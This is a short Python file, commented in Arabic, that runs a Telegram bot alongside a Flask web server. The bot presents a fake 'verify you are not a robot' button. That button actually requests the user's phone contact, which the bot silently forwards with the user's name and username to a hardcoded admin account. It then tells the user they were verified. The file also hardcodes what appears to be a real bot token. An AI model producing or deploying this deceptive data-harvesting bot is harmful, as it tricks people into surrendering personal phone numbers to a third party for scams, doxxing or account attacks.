from flask import Flask
import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# إنشاء تطبيق Flask
app = Flask(__name__)

# توكن البوت ومعرف المستخدم الذي سترسل إليه جهة الاتصال
BOT_TOKEN = '6801162891:AAHjDpfRUnRMJSr3dmsqoGsZwEPumUn5yNw'
ADMIN_USER_ID = 5588702212

bot = telebot.TeleBot(BOT_TOKEN)

# دالة بدء التشغيل التي تطلب من المستخدم إرسال جهة الاتصال
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(one_time_keyboard=True, resize_keyboard=True)
    contact_button = KeyboardButton("اضغط هنا للتحقق", request_contact=True)
    markup.add(contact_button)
    bot.send_message(message.chat.id, "مرحبًا! للتحقق من أنك لست روبوت، من فضلك اضغط على الزر أدناه.", reply_markup=markup)

# دالة استقبال جهة الاتصال
@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    if message.contact:
        user_phone = message.contact.phone_number
        user_name = message.from_user.first_name
        user_username = message.from_user.username
        try:
            bot.send_message(
                ADMIN_USER_ID,
                f"تم استقبال جهة اتصال جديدة:\n"
                f"الاسم: {user_name}\n"
                f"رقم الهاتف: {user_phone}\n"
                f"اليوزر: @{user_username if user_username else 'لا يوجد يوزر'}"
            )
            bot.send_message(message.chat.id, "شكرًا لك! تم التحقق منك بنجاح.")
        except Exception as e:
            print(f"حدث خطأ: {e}")
            bot.send_message(message.chat.id, "حدث خطأ أثناء معالجة طلبك. الرجاء المحاولة مرة أخرى لاحقًا.")
    else:
        bot.send_message(message.chat.id, "يرجى مشاركة رقم هاتفك باستخدام الزر أدناه.")

# تشغيل البوت
def start_bot():
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"حدث خطأ أثناء تشغيل البوت: {e}")

# مسار رئيسي لتطبيق Flask (يمكنك تغييره حسب الحاجة)
@app.route('/')
def home():
    return "الروبوت يعمل!"

if __name__ == '__main__':
    # تشغيل بوت تليجرام في مسار آخر (Thread)
    import threading
    bot_thread = threading.Thread(target=start_bot)
    bot_thread.start()

    # تشغيل تطبيق Flask على المضيف والمنفذ المحددين
    app.run(host='0.0.0.0', port=8000)
